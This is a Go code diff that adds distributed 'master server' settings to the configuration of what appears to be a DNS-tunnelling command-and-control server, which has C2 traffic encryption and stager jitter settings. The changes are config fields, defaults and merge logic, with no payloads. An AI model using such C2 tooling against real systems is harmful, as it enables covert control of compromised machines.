@@ -19,18 +19,24 @@ import (
 // - UpstreamDNS: upstream DNS server to forward queries to (e.g., "8.8.8.8:53")
 // - EncryptionKey: AES key for C2 traffic encryption
 // - Debug: enable detailed logging for troubleshooting
+// - MasterServer: URL of master server (empty = standalone mode, URL = distributed mode)
+// - MasterAPIKey: API key for authentication with master server
+// - MasterServerID: Unique identifier for this DNS server (for master registration)
 type Config struct {
-	BindAddr      string       `json:"bind_addr"`
-	BindPort      int          `json:"bind_port"`
-	SvrAddr       string       `json:"server_address"`
-	Domain        string       `json:"domain"`
-	NS1           string       `json:"ns1"`
-	NS2           string       `json:"ns2"`
-	ForwardDNS    bool         `json:"forward_dns"`
-	UpstreamDNS   string       `json:"upstream_dns"`
-	EncryptionKey string       `json:"encryption_key"`
-	Debug         bool         `json:"debug"`
-	StagerJitter  StagerJitter `json:"stager"`
+	BindAddr       string       `json:"bind_addr"`
+	BindPort       int          `json:"bind_port"`
+	SvrAddr        string       `json:"server_address"`
+	Domain         string       `json:"domain"`
+	NS1            string       `json:"ns1"`
+	NS2            string       `json:"ns2"`
+	ForwardDNS     bool         `json:"forward_dns"`
+	UpstreamDNS    string       `json:"upstream_dns"`
+	EncryptionKey  string       `json:"encryption_key"`
+	Debug          bool         `json:"debug"`
+	StagerJitter   StagerJitter `json:"stager"`
+	MasterServer   string       `json:"master_server"`    // Master server URL (e.g., "https://master.example.com")
+	MasterAPIKey   string       `json:"master_api_key"`   // API key for master authentication
+	MasterServerID string       `json:"master_server_id"` // Unique ID for this DNS server
 }
 
 // StagerJitter holds timing configuration for stager chunk delivery
@@ -66,7 +72,20 @@ func DefaultConfig() Config {
 			RetryDelaySeconds: 3,
 			MaxRetries:        5,
 		},
+		MasterServer:   "",     // Empty = standalone mode
+		MasterAPIKey:   "",     // Set when using distributed mode
+		MasterServerID: "dns1", // Default server ID
 	}
+}
+
+// IsStandaloneMode returns true if DNS server is in standalone mode (no master configured)
+func (c *Config) IsStandaloneMode() bool {
+	return c.MasterServer == ""
+}
+
+// IsDistributedMode returns true if DNS server is in distributed mode (master configured)
+func (c *Config) IsDistributedMode() bool {
+	return c.MasterServer != ""
 }
 
 // LoadConfig attempts to load configuration from a JSON file.
@@ -155,6 +174,17 @@ func LoadConfig() (Config, error) {
 	}
 	if fileCfg.StagerJitter.MaxRetries != 0 {
 		cfg.StagerJitter.MaxRetries = fileCfg.StagerJitter.MaxRetries
+	}
+
+	// Merge master server configuration
+	if fileCfg.MasterServer != "" {
+		cfg.MasterServer = fileCfg.MasterServer
+	}
+	if fileCfg.MasterAPIKey != "" {
+		cfg.MasterAPIKey = fileCfg.MasterAPIKey
+	}
+	if fileCfg.MasterServerID != "" {
+		cfg.MasterServerID = fileCfg.MasterServerID
 	}
 
 	return cfg, nil
